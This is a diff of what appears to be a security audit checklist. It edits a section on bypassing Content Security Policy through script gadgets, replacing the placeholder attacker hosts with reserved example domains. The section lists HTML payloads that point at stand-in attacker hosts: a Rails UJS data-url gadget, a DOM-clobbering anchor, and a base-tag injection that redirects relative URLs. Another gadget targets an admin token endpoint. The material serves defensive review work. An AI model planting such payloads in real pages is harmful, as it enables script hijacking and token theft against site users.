@@ -100,10 +100,10 @@ grep -rn "javascript:\|data:\|vbscript:" . | grep -i "block\|reject\|sanitize\|v
 
 ### P-5 — CSP bypass via script gadgets
 Gadget types:
-- **Data attribute gadgets:** `<div data-remote="true" data-url="attacker.com">` → Rails UJS triggers
+- **Data attribute gadgets:** `<div data-remote="true" data-url="attacker.example.com">` → Rails UJS triggers
 - **Class-based gadgets:** `<div class="js-auto-submit" data-endpoint="/api/tokens?scope=admin">`
-- **DOM clobbering:** `<a id="config" href="attacker.com">` clobbers `window.config`
-- **Base tag injection:** `<base href="//evil.com/">` redirects all relative URLs
+- **DOM clobbering:** `<a id="config" href="attacker.example.com">` clobbers `window.config`
+- **Base tag injection:** `<base href="//evil.example.com/">` redirects all relative URLs
 
 Search:
 ```
